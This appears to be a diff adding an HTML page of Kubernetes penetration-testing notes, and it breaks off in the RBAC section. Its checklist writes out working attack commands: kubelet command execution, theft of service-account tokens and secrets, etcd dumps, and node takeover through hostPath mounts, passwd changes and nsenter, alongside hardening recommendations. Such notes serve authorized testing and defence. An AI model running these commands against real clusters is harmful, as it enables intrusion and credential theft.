@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Attacking Kubernetes - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Introduction", url: "#_top", children: [
+              {title: "Managed vs unmanaged", url: "#managed-vs-unmanaged" },
+              {title: "Some terminology", url: "#some-terminology" },
+              {title: "Useful kubectl commands", url: "#useful-kubectl-commands" },
+              {title: "Components", url: "#components" },
+              {title: "Tools", url: "#tools" },
+          ]},
+          {title: "External Pentest", url: "#external-pentest", children: [
+              {title: "Check open ports", url: "#check-open-ports" },
+          ]},
+          {title: "Internal Pentest", url: "#internal-pentest", children: [
+              {title: "Useful recon commands", url: "#useful-recon-commands" },
+              {title: "Basic tests", url: "#basic-tests" },
+              {title: "Authorization", url: "#authorization" },
+              {title: "Security Audit", url: "#security-audit" },
+              {title: "Resources", url: "#resources" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../attacking_kubernetes_checklist/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../attacking_kubernetes_checklist/" class="btn btn-xs btn-link">
+        Attacking Kubernetes Checklist
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../kubernetes_hacking_tools/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../kubernetes_hacking_tools/" class="btn btn-xs btn-link">
+        Setting Up Tools
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">#</a></h1>
+<h2 id="managed-vs-unmanaged">Managed vs unmanaged<a class="headerlink" href="#managed-vs-unmanaged" title="Permanent link">#</a></h2>
+<p>A good thing to ask the customer is if they are running a managed or unmanaged cluster. That is, is the cluster managed by gcloud (GKE), AWS (EKS), or Microsoft (AKS),  or some other cloud-provider? If it is, it's a bit less likely that some of the configuration mistakes are made. It also means that the administrators of the cluster might have less ability to manage the cluster themselves.
+How much of the cluster that is managed depends on the cloud provider. They might be responsible for updating kubernetes, and configure the Master node, and only let the customer control the worker nodes.
+In GKE for example, the Control Plane is managed by Gcloud, and the worker nodes are managed by the customer. The Control Plane (Cluster Master/ Master Node) is essentially a black box to the administrator.</p>
+<p>Another managed kubernetes provider is Rancher.</p>
+<p>A drawback of using a managed cluster is that you might not have access to all features that is available in a unmanaged cluster.</p>
+<p>If you run an unmanaged cluster you will have access to the master node, and you will be repsonsible for updating kubernetes.</p>
+<h2 id="some-terminology">Some terminology<a class="headerlink" href="#some-terminology" title="Permanent link">#</a></h2>
+<p><strong>Kubernetes API</strong></p>
+<p>This API is accessible on port 6443 or 443 (GCE, and other Cloud providers usually run it on port 443, while the default is on 6443) on the master node. It is the API that <code>kubectl</code> uses, and through it you managed the desired state of your cluster. If you have high priviliges to the API you own the cluster. It is with this API that you defined things such as: what pods to run, how many replicas, what network and disk resources you want to make available.</p>
+<p>The API is the single source of truth.</p>
+<p>The API is sometimes referred to as <code>kube-apiserver</code> because that is the name of the server running on the Cluster master.</p>
+<p><strong>Kubernetes Control Plane</strong> </p>
+<p>The Control Plane is in charge of putting your cluster in the state that you configured through the Kubernetes API. The term Control Plane is kind of an umberella term to combine several processes running on the master and worker nodes.
+The Kubernetes Master is a set of three processes that are running on your Master Node. Those processes are: <code>kube-apiserver</code>, <code>kube-controller-manager</code>, and <code>kube-scheduler</code>.
+Each non-master node runs the following processes: <code>kubelet</code> and <code>kube-proxy</code>.
+The <code>kubelet</code> process communicates with the Kubernetes Master.
+The <code>kube-proxy</code> is a network proxy which reflects Kubernetes networking services on each node.</p>
+<p><strong>Master node aka Cluster master</strong></p>
+<p>The master node usually runs these services/processes:
+<code>kube-apiserver</code> - API Server - Available on port 443 - It communicates with <code>kubelet</code>, available on the worker nodes. The communication is bi-directional.</p>
+<p>ETCD - 
+Scheduler - </p>
+<p>In a managed cluster, like GKE, google is responsible to upgrade the Master. But you can also manually upgrade it using <code>gcloud</code> CLI tool.</p>
+<p><strong>Worker node</strong></p>
+<p>A cluster typically has at least one or more nodes. When people say nodes they usually refer to these worker nodes.
+It is sometimes called: cluster node, worker node.
+A worker node is hardware (or virtualized hardware). You need a dedicated VM to function as your worker node. In GKE the worker nodes are just VM-instances.</p>
+<p>The worker node usually runs these services/processes:</p>
+<p><code>Kubelet</code> - The communication between the <code>kubelet</code> and the <code>kube-apiserver</code> is bi-directional. The communication goes over REST HTTP.</p>
+<p>cAdvisor - </p>
+<p>Kube-proxy</p>
+<p>Pod - The pods are running on the worker node. But it is the <code>kube-apiserver</code> that holds the information about pods, like how many replicas it should have, etc.</p>
+<p>In managed cluster. Like GKE, you never ssh straight to the worker node. Instead the worker node is administrated through <code>gcloud</code> CLI tool or through the web console.</p>
+<p>The worker node usually have a few different interfaces. One interface on the kubernetes network, where the pods are. A one interface connected to the gcloud network.</p>
+<p><strong>Workloads</strong></p>
+<p>You often hear the concept Workloads mentioned. Kubernetes divides workloads into a few different types.1. Deployments
+2. StatefulSets
+3. DaemonSets
+4. Jobs
+5. Cronjobs</p>
+<p><strong>Namespace</strong></p>
+<p>Namespaces are a way to divide cluster resources in different groups, or namespaces. This can be useful when you want a user to only be able to access certain resources. Those resources can be put in a specific namespace that only that user has access to.</p>
+<p>A common usecase would be to create a development and a production namespace.</p>
+<p>Users interacting with one namespace do not see the content in another namespace.</p>
+<p><strong>Admission controller</strong></p>
+<p>You here this term quite a bit. An admission controller intercept objects between the user and the apiserver, kind of. An easy way to understand admission controller is to take the admission controller PodSecurityPolicy as an example.</p>
+<p>A pods properties is usually defined in a yaml file. And it is then deployed using this command:</p>
+<pre><code>kubectl apply -f podfile.yaml
+</code></pre>
+
+<p>The specification from the file is sent to the apiserver which then performs its magic and deploys the pod. If you have defined a PodSecurityPolicy the pod you are about to deploy is checked against the PodSecurityPolicy to make sure that the pod adheres to that policy, if it does not the deployment is stopped, and if it adheres to the policy the pod is deployed.</p>
+<p>There are two types of admission controllers: validating and mutating. Validating just valides the object, and mutating mutates it.</p>
+<p>There are many other admission controllers:</p>
+<p>https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/</p>
+<h2 id="useful-kubectl-commands">Useful kubectl commands<a class="headerlink" href="#useful-kubectl-commands" title="Permanent link">#</a></h2>
+<p>The most important:</p>
+<pre><code>kubectl api-resources
+</code></pre>
+
+<p>The greatest kubectl flag you will ever see: <code>-v=9</code>. Incredible verbosity:
+You will understand exactly what kubectl is actually doing.</p>
+<pre><code>kubectl -v=9 get pods
+
+</code></pre>
+
+<h2 id="components">Components<a class="headerlink" href="#components" title="Permanent link">#</a></h2>
+<p><strong>Etcd</strong></p>
+<p>Etcd is a service, normally running on port 2379. Its job is to store data related to the cluster. Things such as configuration data, state, and metadata. Etcd is distributed, which means that it usually runs on every cluster node.</p>
+<p><strong>RBAC</strong></p>
+<p>RBAC stands for Role-Based Access Control.
+It is the authorization model used in Kubernetes. It replaced Attribute Based Access Control (ABAC) since version 1.6.</p>
+<p>RBAC allows the cluster administrator perform granular access control. Specifying what each user and servoce account can do.
+A user can have a specific role. It is possible to specify which Object a Role should have access to, and which actions (called verbs) theys hould be able to perform. If the cluster is a managed cluster, like GKE, it is possible, and common, to integreate the cloud IAM with kubernetes RBAC.</p>
+<p>RBAC lets us define what subjects can take what actions on what types of objects, in what namespaces. 
+RBAC is configured by configuring User (Service user or human-user), Roles and RoleBinding. So we can create a user, then a role, and the we will bind the user to that role. This can be done with just one configuration file, for example like this:</p>
+<pre><code>kubectl create -f user.yaml
+</code></pre>
+
+<pre><code>---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: mynamespace-user
+  namespace: mynamespace
+
+---
+kind: Role
+apiVersion: rbac.authorization.k8s.io/v1beta1
+metadata:
+  name: mynamespace-user-full-access
+  namespace: mynamespace
+rules:
+- apiGroups: [&quot;&quot;, &quot;extensions&quot;, &quot;apps&quot;]
+  resources: [&quot;*&quot;]
+  verbs: [&quot;*&quot;]
+- apiGroups: [&quot;batch&quot;]
+  resources:
+  - jobs
+  - cronjobs
+  verbs: [&quot;*&quot;]
+
+---
+kind: RoleBinding
+apiVersion: rbac.authorization.k8s.io/v1beta1
+metadata:
+  name: mynamespace-user-view
+  namespace: mynamespace
+subjects:
+- kind: ServiceAccount
+  name: mynamespace-user
+  namespace: mynamespace
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: mynamespace-user-full-access
+</code></pre>
+
+<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">#</a></h2>
+<p>There are a number of tools that can facilitate the pentest or audit of a kubernetes network.</p>
+<p><strong>kube-hunter</strong></p>
+<p>Url: https://github.com/aquasecurity/kube-hunter
+The tool can audit from the external perspective or internal. It can perform a passive or active scans. In active scans the tool will actually exploit vulnerabilities. If you run this you may alter the cluster you are testing, so be careful.
+The tool can perform many checks such as:</p>
+<p>Passive Hunters:</p>
+<ul>
+<li>
+<p>Mount Hunter - /var/log
+  Hunt pods that have write access to host's /var/log. in such case, the pod can traverse read files on the host machine</p>
+</li>
+<li>
+<p>AKS Hunting
+  Hunting Azure cluster deployments using specific known configurations</p>
+</li>
+<li>
+<p>Host Discovery
+  Generates ip adresses to scan, based on cluster/scan type</p>
+</li>
+<li>
+<p>K8s Dashboard Discovery
+  Checks for the existence of a Dashboard</p>
+</li>
+<li>
+<p>Kubelet Discovery
+  Checks for the existence of a Kubelet service, and its open ports</p>
+</li>
+<li>
+<p>Kubelet Secure Ports Hunter
+  Hunts specific endpoints on an open secured Kubelet</p>
+</li>
+<li>
+<p>Kubelet Readonly Ports Hunter
+  Hunts specific endpoints on open ports in the readonly Kubelet server</p>
+</li>
+<li>
+<p>API Server Hunter
+  Checks if API server is accessible</p>
+</li>
+<li>
+<p>Port Scanning
+  Scans Kubernetes known ports to determine open endpoints for discovery
+  It takes the local ip, and scans the entire range for open ports such as: 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379</p>
+</li>
+<li>
+<p>Certificate Email Hunting
+  Checks for email addresses in kubernetes ssl certificates</p>
+</li>
+<li>
+<p>API Service Discovery
+  Checks for the existence of K8s API Services</p>
+</li>
+<li>
+<p>K8s CVE Hunter
+  Checks if Node is running a Kubernetes version vulnerable to known CVEs</p>
+</li>
+<li>
+<p>Etcd Remote Access
+  Checks for remote availability of etcd, its version, and read access to the DB</p>
+</li>
+<li>
+<p>Proxy Discovery
+  Checks for the existence of a an open Proxy service</p>
+</li>
+<li>
+<p>Host Discovery when running as pod
+  Generates ip adresses to scan, based on cluster/scan type</p>
+</li>
+<li>
+<p>Pod Capabilities Hunter
+  Checks for default enabled capabilities in a pod</p>
+</li>
+<li>
+<p>Dashboard Hunting
+  Hunts open Dashboards, gets the type of nodes in the cluster</p>
+</li>
+<li>
+<p>Api Version Hunter
+  Tries to obtain the Api Server's version directly from /version endpoint</p>
+</li>
+<li>
+<p>Kubectl CVE Hunter
+  Checks if the kubectl client is vulnerable to known CVEs</p>
+</li>
+<li>
+<p>Etcd service
+  check for the existence of etcd service</p>
+</li>
+<li>
+<p>Access Secrets
+  Accessing the secrets accessible to the pod</p>
+</li>
+<li>
+<p>Kubectl Client Discovery
+  Checks for the existence of a local kubectl client</p>
+</li>
+<li>
+<p>Proxy Hunting
+  Hunts for a dashboard behind the proxy</p>
+</li>
+<li>
+<p>API Server Hunter
+  Accessing the API server using the service account token obtained from a compromised pod</p>
+</li>
+</ul>
+<p>Active Hunters:</p>
+<ul>
+<li>
+<p>Kubelet Container Logs Hunter
+  Retrieves logs from a random container</p>
+</li>
+<li>
+<p>Prove /var/log Mount Hunter
+  Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log</p>
+</li>
+<li>
+<p>Kubelet Run Hunter
+  Executes uname inside of a random container</p>
+</li>
+<li>
+<p>K8s Version Hunter
+  Hunts Proxy when exposed, extracts the version</p>
+</li>
+<li>
+<p>Build Date Hunter
+  Hunts when proxy is exposed, extracts the build date of kubernetes</p>
+</li>
+<li>
+<p>Azure SPN Hunter
+  Gets the azure subscription file on the host by executing inside a container</p>
+</li>
+<li>
+<p>API server hunter
+  Accessing the api server might grant an attacker full control over the cluster</p>
+</li>
+<li>
+<p>Arp Spoof Hunter
+  Checks for the possibility of running an ARP spoof attack from within a pod (results are based on the running node)</p>
+</li>
+<li>
+<p>Etcd Remote Access
+  Checks for remote write access to etcd- will attempt to add a new key to the etcd DB</p>
+</li>
+<li>
+<p>Kubelet System Logs Hunter
+  Retrieves commands from host's system audit</p>
+</li>
+<li>
+<p>DNS Spoof Hunter
+  Checks for the possibility for a malicous pod to compromise DNS requests of the cluster (results are based on the running node)</p>
+</li>
+</ul>
+<h1 id="external-pentest">External Pentest<a class="headerlink" href="#external-pentest" title="Permanent link">#</a></h1>
+<p>In an external pentest the scenario is that you do not have access to the kubernetes cluster at all. There is not that much kubernetes-specific attacks that can be performed. Mainly scan for open ports that might be related to kubernetes.</p>
+<h2 id="check-open-ports">Check open ports<a class="headerlink" href="#check-open-ports" title="Permanent link">#</a></h2>
+<pre><code>nmap &lt;ip&gt; -p 
+</code></pre>
+
+<pre><code>443/tcp - Kubernetes API server
+2379/tcp - Etcd
+2380/tcp - Etcd 
+6666/tcp - Etcd
+4194/tcp - cAdvisor - Container Metrics
+6443/tcp - Kubernetes API server
+8443/tcp - Minikube API server
+8080/tcp - Kubernetes API server
+10250/tcp - Kubelet - HTTPS API with full node access
+10255/tcp - Kubelet - Unauthenticated readonly. Pods/runnings pods/nodes
+10256/tcp - Kube-proxy - Kube proxy health check server
+9099/tcp - Calico Felix - Health check server for Calico
+6782-4/tcp - Weave
+44134/tcp - Tiller
+44135/tcp - Tiller
+30000-32767/TCP - Nodeport
+</code></pre>
+
+<ul>
+<li>[ ] Check if the API-server is exposed externally
+If you have access to a configured <code>kubectl</code> you can retreive the IP-address of the master node with the following command: <code>kubectl config view</code> and then check for <code>server: https://&lt;ip&gt;</code>.</li>
+</ul>
+<p>The Kubernetes API server by default prohibits "Anonymous" users to interact with it. 
+If a request is made without any bearer-token the user is given the username <code>system:anonymous</code> and the group <code>system:unauthenticated</code>. </p>
+<p>However, you never know it might be misconfigured and allow anonymous.</p>
+<ul>
+<li>[ ] Check if kubelet port 10255 is exposed - for information disclosure
+Kubelet is running on all worker nodes. It is running on port 10255, and no authentication is required. It is only possible to read from the API. It is meant to be exposed unauthenticated from inside the cluster. But not externally.</li>
+</ul>
+<p>Check to see if the port is accessible on all workers nodes external addresses:</p>
+<pre><code>curl http://&lt;external worker node ip&gt;:10255/pods
+</code></pre>
+
+<h1 id="internal-pentest">Internal Pentest<a class="headerlink" href="#internal-pentest" title="Permanent link">#</a></h1>
+<h2 id="useful-recon-commands">Useful recon commands<a class="headerlink" href="#useful-recon-commands" title="Permanent link">#</a></h2>
+<pre><code>kubectl get nodes -o wide -A
+</code></pre>
+
+<p><strong>Get external IP of master node</strong></p>
+<pre><code>kubectl config view
+</code></pre>
+
+<p><strong>Get internal IP of master node</strong></p>
+<pre><code>kubectl get svc -o wide
+# The clusterIP is the internal IP to your master node
+</code></pre>
+
+<p>Check the environment variables in the Pod:</p>
+<pre><code>env
+#KUBERNETES_PORT_443_TCP_PROTO=tcp
+#KUBERNETES_PORT_443_TCP_ADDR=10.39.240.1
+#KUBERNETES_SERVICE_HOST=10.39.240.1
+#KUBERNETES_PORT=tcp://10.39.240.1:443
+#KUBERNETES_PORT_443_TCP_PORT=443
+#
+</code></pre>
+
+<p>This will resolve to a Service IP which in turn will be routed to the API server.</p>
+<pre><code>host kubernetes.default.svc
+</code></pre>
+
+<p><strong>Get IP:s of worker nodes</strong></p>
+<p>If you have access to <code>kubectl</code>.</p>
+<pre><code>kubectl get nodes -o wide
+</code></pre>
+
+<p>If you have kubectl and want to run it with a service-token:</p>
+<pre><code>kubectl --insecure-skip-tls-verify=true --server=&quot;https://&lt;internal or external kube-apiserver ip&gt;:443&quot; --token=&quot;eyJ[...]&quot; get pods
+</code></pre>
+
+<p>If you are in a pod with kube-hunter you can run:</p>
+<pre><code>python kube-hunter --interface --mapping
+</code></pre>
+
+<p>What is basically does is that it performs a port-scan of the entire range of the pods internal IP-address. It looks for ports like 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379</p>
+<p><strong>Check what node a pod is running on</strong></p>
+<pre><code>kubectl get pod &lt;name-of-pod&gt; -o yaml
+
+</code></pre>
+
+<p><strong>Port scan the cluster</strong></p>
+<p>Check your ip and subnet in the pod:</p>
+<pre><code>ip a
+</code></pre>
+
+<p>Scan the cidr for interesting ports, you will find other Pods and other nodes.</p>
+<pre><code>nmap 10.36.0.1/24 -p 8001,8080,10250,10255,30000,443,6443,2379
+</code></pre>
+
+<h2 id="basic-tests">Basic tests<a class="headerlink" href="#basic-tests" title="Permanent link">#</a></h2>
+<ul>
+<li>[ ] Check for anonymous access to <code>kube-apiserver</code></li>
+</ul>
+<p>See "Useful recon commands" how to get the external or internal IP of the kube-apiserver.
+The entire kube-apiserver API documentation is found here: https://docs.openshift.com/container-platform/3.3/rest_api/kubernetes_v1.html
+By default interesting API endpoints are restricted by default, but you never know until you try.</p>
+<pre><code>curl -k https://&lt;external or internal ip to kube-apiserver&gt;:443/api/v1/componentstatus
+curl -k https://&lt;external or internal ip to kube-apiserver&gt;:443/api/v1/namespaces/default/secrets
+</code></pre>
+
+<p>You should get a response with Forbidden if it doesn't work.</p>
+<ul>
+<li>[ ] Check for anonymous access to ETCD</li>
+</ul>
+<p>Etcd by default does not allow anonymous access to its database, but you never know.</p>
+<p>kube-hunter checks for the existence of an etcd service on the subnet. It also checks if the user has read access to it.</p>
+<pre><code>curl http://&lt;internal or external ip&gt;:2379/version
+curl http://&lt;internal or external ip&gt;:2379/v2/members
+curl http://&lt;internal or external ip&gt;&gt;:2379/v2/keys/?recursive=true
+
+# Or using the etcdctl tool
+etcdctl -endpoints=http://&lt;MASTER-IP&gt;:2379 get / -prefix -keys-only
+</code></pre>
+
+<p>In GKE port 2379 is only available to the Master API through the loop-back interface. So the port is not exposed externally or on the internal network.</p>
+<ul>
+<li>[ ] Check if kubelet port 10250 is accessible unauthenticated.</li>
+</ul>
+<p>Kubelet is a service that is running on the worker nodes. It is just a REST API running on port 10250 and 10255. The idea of the Kubelet API is to receive instructions from the <code>kube-apiserver</code> service on the master node. Since it is not meant for human users its API is actually not documented. But by reading the source we know a little bit about it. For example, the following endpoints:</p>
+<pre><code>curl -k https://workernode:10250/pods
+curl -k https://k8-node:10250/runningpods/
+Lists running pods
+curl -k https://workernode:10250/exec
+Executes a command in a container, and returns a link to view the output.
+</code></pre>
+
+<p>If you get "Unauthorized" well, then anonymous users are not authorized to access the API.
+If you get a response to the /pods request, it might mean that it allows anonymous authentication. Which means that you might be able to RCE the pods. By using the <code>exec</code> endpoint you can execute commands on other pods.</p>
+<pre><code>curl -k -XPOST &quot;https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq&quot; -d &quot;cmd=ls -la /&quot;
+
+# You can also check the environment variable to see if you can get the kubelet token:
+curl -k -XPOST &quot;https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq&quot; -d &quot;cmd=env&quot;
+</code></pre>
+
+<p>For reference on how to exploit this see: http://carnal0wnage.attackresearch.com/2019/01/kubernetes-unauth-kublet-api-10250_16.html</p>
+<ul>
+<li>[ ] Check kubelet port 10255 (read only) for information disclosure</li>
+</ul>
+<p>Kubelet is running on  port 10255, but is read-only. It is nothing to report if it is only available on the inside of the cluster, but it should not be exposed externally. It can still be useful to an attacker inside the cluster, as a way to gather information.</p>
+<pre><code>curl -k http://10.36.2.1:10255/pods
+</code></pre>
+
+<ul>
+<li>[ ] Check for Service account secret / token</li>
+</ul>
+<p>If no service account is specified for a Pod, the Pod is automatically assigned the default service account in the namespace.</p>
+<p>Each pod is provided with a service account by default. The extent of the priviliges that is given to that account is configurable. So it is best to just verify it by testing it.
+The secret token is created and put in a volume that is automatically mounted to pods with the default service account.
+You can access the service account token (A JWT) in the Pod at the following path:</p>
+<pre><code>/var/run/secrets/kubernetes.io/serviceaccount/token
+</code></pre>
+
+<p>You can take the JWT and try to authenticate to the <code>kube-apiserver</code> like this:
+Note that the port can be 443 or 6443. So try both.</p>
+<pre><code>curl -k -H &quot;Authorization: Bearer eyJhbG[...] &quot; https://&lt;masternode ip&gt;:443/api/v1/namespaces/default/secrets
+</code></pre>
+
+<p>Another way to do it is with kubectl like this:</p>
+<pre><code>kubectl --insecure-skip-tls-verify=true --server=&quot;https://&lt;masternode-ip&gt;:443&quot; --token=&quot;eyJh[...]&quot; get secrets --all-namespaces -o json
+</code></pre>
+
+<p>kube-kunter also performs this check when running with the --pod flag, like this</p>
+<pre><code>python kube-hunter.py --pod
+</code></pre>
+
+<p>Reference to hack: https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0</p>
+<p><strong>Recommendation</strong></p>
+<p>You can configure an admission controller to not automatically mount the token.</p>
+<ul>
+<li>[ ] Check for CVE-2018–1002105</li>
+</ul>
+<p>The vulnerability allows users permitted to one namespace to interact with the Master API in other namespaces.</p>
+<p>It is easy to test for, the issue is fixed in the following versions, and above:</p>
+<pre><code>    v1.10.11
+    v1.11.5
+    v1.12.3
+</code></pre>
+
+<pre><code>kubectl version
+</code></pre>
+
+<p>For how to exploit it see: https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb
+https://gravitational.com/blog/kubernetes-websocket-upgrade-security-vulnerability/</p>
+<ul>
+<li>[ ] Check for usage of Helm</li>
+</ul>
+<p>There is a kubernetes package manager called Helm.
+Helm consists of a Client, which is the Helm Client. ANd a server, called Tiller server.
+The Helm repository is just a simple webserver from which you can search and find packages.</p>
+<p>Tiller is a server running the cluster.</p>
+<ul>
+<li>[ ] HostPath - Mount worker node root directory to Pod</li>
+</ul>
+<p>If you have an account that can deploy pods, you can mount the node workers root directory into the pod. And thereafter access the node workers root directory, and for example change the password of a user, which you can then use to ssh into the node.</p>
+<p>This attack can be performed in the following way:
+Create a new pod, like the following, and aplly it:</p>
+<pre><code>kubectl apply -f testdeployment.yaml
+</code></pre>
+
+<pre><code class="yaml">apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: testpod-deployment
+  labels:
+    app: testpod
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: testpod
+  template:
+    metadata:
+      labels:
+        app: testpod
+    spec:
+      containers:
+      - name: testpod
+        image: gcr.io/kuberntest/kubeaudit:latest
+        volumeMounts:
+        - mountPath: /root
+          name: rooten
+      volumes:
+      - name: rooten
+        hostPath:
+          path: /
+</code></pre>
+
+<p>Now you can just use chroot and change the password of a user, and then ssh into the node worker with that user.</p>
+<pre><code>cd /root
+chroot /root /bin/bash
+passwd &lt;someuser&gt; 
+</code></pre>
+
+<p>In order to perform this attack against all the node-workers it is posssible to deploy a DaemonSet. A DaemonSet is a workload that ensures that a Pod is run on all worker nodes. If new worker nodes are added to the cluster the DaemonSet will ensure that each has the specified pod running on it. It can be sueful if you want to run a logs collection daemon on all nodes, or a monitoring daemon.
+Those pods usually mount the nodes log directory to the pod.
+This can be used to ensure that out malicious pod available on all worker nodes.</p>
+<p><strong>Recommendation</strong></p>
+<p>You can create a PodSecurityPolicy that disallows pods from mounting the root directory from the Host.</p>
+<p>You can also create a network policy that disallows outgoing traffic, thus preventing reverse shells a bit.</p>
+<ul>
+<li>[ ] Check if running Kubelet on master node</li>
+</ul>
+<p>If you are running kubelet on a master node, and the user is able to mount a directory from the host into the pod, then you will be able to gain access to the etcd certificates. With these certificates it is possible to comunicate directory to etcd, and thereby retreive secrets/tokens of high priviliged users.</p>
+<p>Note that in your manifest file you can specify which node you want to deploy your POD on. By doing that you can specify that you want to deploy your pod on the master node (if that node is running kubelet). This means that the scheduler, is not a security boundry, you can simply just bypass the scheduler.</p>
+<p>The attack is explained here, around minute 16: https://www.youtube.com/watch?v=HmoVSmTIOxM</p>
+<p><strong>Recommendation</strong></p>
+<ul>
+<li>Don't run kubelet on the control plane (On the master-node)</li>
+<li>Don't allow mounting of HostPath</li>
+<li>
+<p>Sheduler is not a security component - exact node can be specified in the POD manifest</p>
+</li>
+<li>
+<p>[ ] Check for Docker-in-Docker</p>
+</li>
+</ul>
+<p>Some people want to run docker in a Pod. In order to do that they usually mount the worker-node docker-socket into the Pod. This is usually done using hostPath in the pod/deployment manifest file.
+The docker api is unauthenticated, so anyone with access to the socker can interact with it.</p>
+<p>To check for it grab all the deployment and pod manifest-files, and search for:</p>
+<pre><code>hostPath:
+   path: /var/run/docker.sock
+</code></pre>
+
+<p>Note that this attack works evern though privilige-escalation is denied, and the Pod is running as a non-root user.</p>
+<p>So, if the docker-socket is mounted, a user within the Pod can run a docker-container on the underlying host, the worker node, for example. If you can do that, you can mount a worker node directory, such as /etc, to your docker container, and from there gain access to the underlying filesystem.</p>
+<p><strong>Recommendation</strong></p>
+<ul>
+<li>Don't mount the docker-socket to a Pod.</li>
+<li>
+<p>Restrict usage of hostPath with an admission controller.</p>
+</li>
+<li>
+<p>[ ] Check for HostPid allow</p>
+</li>
+</ul>
+<p>So just like you are able to escalate priviliges by mounting in the host root directory, it is also possible to escalate priviliges if you are allowed to create a Pod with the <code>hostPid</code>.</p>
+<p>See how to attack this here: https://www.youtube.com/watch?v=HmoVSmTIOxM</p>
+<p>If the Pod is deployed with these settings:</p>
+<pre><code>securityContext:
+    priviliged: true
+hostPID: true
+</code></pre>
+
+<p>It means that you can run the following command in the Pod to get a root shell on the underlying host:</p>
+<pre><code>sudo nsenter -a -t 1 bash
+</code></pre>
+
+<p><strong>Recommendation</strong></p>
+<ul>
+<li>Use the adminission controller Pod Security Policy and disallow hostPid.</li>
+<li>
+<p>Restrict the use of "priviliged" containers</p>
+</li>
+<li>
+<p>[ ] Check which services are exposed</p>
+</li>
+</ul>
+<p>When an application is deployed, through a Pod or Deployment, it will not automatically become available to users outside the kubernetes cluster. In order to direct traffic to those services a kubernetes service is needed.</p>
+<p>We need to check what services are exposed externally, to see if any sensitive servicea accidentally has been expoesed.</p>
+<p>If those services are vulnerable or not can be considered out of scope (we are not testing the applications hosted on the cluster). But some kubernetes specific services might be exposed, and that might constitute a finding.</p>
+<pre><code>kubectl get services -A -o wide
+</code></pre>
+
+<ul>
+<li>[ ] Check which versions kubernetes components are running</li>
+</ul>
+<p>A kubernetes cluster consist of many components, and those components vary from cluster to cluster. Some of these components are vulnerable, for example older Traefik versions are vulnerable to RCE.
+You can check which versions the components have by checking which image they use, this can be</p>
+<p>Check which image versions of deployments:</p>
+<pre><code>kubectl describe deployments -A
+</code></pre>
+
+<h2 id="authorization">Authorization<a class="headerlink" href="#authorization" title="Permanent link">#</a></h2>
+<p>There are some quirks regarding the authorization system that might be interesting.</p>
+<p>For example, a user (maybe even a service account) might have the right to execute commands on pods, but it might not have the right to deploy new pods. If that is the case then it is possible to simply execute a command on other pods and extract the auto-mounted credentials, and then use those credentials to, for example, deploy a new pod.</p>
+<p>In this way it is possible to escalate in priviliges within a cluster.</p>
+<p>The most basic components of RBAC (Roles Based Access Control) are the following:</p>
+<p><strong>ClusterRoles</strong></p>
+<p>A ClusterRole applies to the whole cluster. </p>
+<p><strong>Roles</strong></p>
+<p>A normal Role only applies to a specific namespace.</p>
+<p><strong>ClusterRoleBindings</strong></p>
+<p><strong>RoleBindings</strong></p>
+<p>RBAC grant access to <strong>resources</strong> with specifc verbs, like <strong>get</strong>, <strong>describe</strong>. A resource is basically information that can be access. Secrets, pod information etc.
+The verbs specify how the resource can be access, get,list,watch etc.
+RoleBindings and ClusterRoleBinding is of course the way we bind a specific role to a specific user.</p>
+<p>One tool that I have found that can be of interest is this:</p>
+<p>https://raw.githubusercontent.com/cyberark/kubernetes-rbac-audit/master/ExtensiveRoleCheck.py</p>
+<p>https://github.com/cyberark/kubernetes-rbac-audit</p>
+<pre><code>kubectl get roles --all-namespaces -o json &gt; Roles.json
+kubectl get clusterroles -o json &gt; clusterroles.json
+kubectl get rolebindings --all-namespaces -o json &gt; rolebindings.json
